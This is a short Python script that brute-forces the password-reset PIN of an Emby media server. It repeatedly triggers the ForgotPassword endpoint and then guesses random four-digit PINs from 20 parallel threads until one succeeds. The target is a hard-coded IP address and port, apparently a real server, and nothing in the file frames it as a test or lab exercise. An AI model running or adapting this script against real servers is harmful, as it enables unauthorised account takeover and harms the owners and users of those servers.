import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

host = 'http://218.1.145.100:8096'

found_event = threading.Event()
lock = threading.Lock()
foo = ''

def generate_pin():
    url = f'{host.rstrip("/")}/emby/Users/ForgotPassword'
    headers = {'Content-Type': 'application/json'}
    try:
        resp = requests.post(url, headers=headers, verify=False, timeout=5)
        return resp.status_code == 200
    except Exception:
        return False


def try_single_pin(session, timeout=3):
    random_pin = random.randint(0, 9999)
    pin = str(random_pin).zfill(4)
    print(f"Try with random PIN: {pin}")
    url = f'{host.rstrip("/")}/emby/Users/ForgotPassword/Pin'
    payload = {"Pin": str(pin).zfill(4)}
    try:
        resp = session.post(url, json=payload, timeout=timeout, verify=False)
    except Exception:
        return False

    if resp.status_code != 200:
        return False

    try:
        result = resp.json()
    except ValueError:
        return False

    if result.get("Success") is True:
        global foo
        foo = result
        return True

    return False


def get_pin_loop(timeout, sleep_between):

    session = requests.Session()
    session.headers.update({'Content-Type': 'application/json'})

    while not found_event.is_set():
        ok = generate_pin()
        if not ok:
            time.sleep(sleep_between)
            continue

        attempted = try_single_pin(session, timeout=timeout)
        if attempted:
            with lock:
                found_event.set()
            break
        time.sleep(sleep_between)

    session.close()


def get_pin(workers, timeout,sleep_between):
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(get_pin_loop, timeout,sleep_between) for _ in range(workers)]
        for f in futures:
            f.result()

if __name__ == "__main__":
    get_pin(workers=20, timeout=3,sleep_between=0.2)
    print(foo)
